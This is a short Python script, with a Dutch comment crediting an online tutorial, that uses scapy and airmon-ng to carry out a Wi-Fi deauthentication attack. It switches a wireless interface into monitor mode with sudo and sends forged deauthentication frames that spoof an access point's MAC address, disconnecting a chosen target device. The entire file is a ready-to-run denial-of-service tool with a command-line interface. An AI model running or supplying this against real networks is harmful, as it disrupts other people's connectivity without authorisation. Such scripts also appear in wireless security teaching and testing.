from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from scapy.sendrecv import sendp
import argparse
import subprocess
# Functie is gebaseerd op de code van de volgende site: https://thepythoncode.com/article/force-a-device-to-disconnect-scapy
def access_point_dos(mac_address_gateway, mac_address_target, count, interface="wlo1"):
    subprocess.run(["sudo", "airmon-ng", "start", f"{interface}"])
    dot11  = Dot11(addr1=mac_address_target, addr2=mac_address_gateway, addr3=mac_address_gateway)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, inter=0.05, count=count, iface=f"{interface}mon", verbose=1)
    subprocess.run(["sudo", "airmon-ng", "stop", f"{interface}mon"])


def main():
    parser = argparse.ArgumentParser(description="Execute a Deauthentication attack on an access point.")
    parser.add_argument("mac_address_access_point", help="MAC address of the access point (gateway)")
    parser.add_argument("mac_address_target", help="MAC address of the target device")
    parser.add_argument("count", type=int, help="Number of deauthentication packets to send")
    parser.add_argument("--interface", default="wlo1", help="Name of the network interface to use (default: wlo1)")

    args = parser.parse_args()
    
    access_point_dos(args.mac_address_access_point, args.mac_address_target, args.count, args.interface)

if __name__ == "__main__":
    print("Starting deauth attack")
    main()
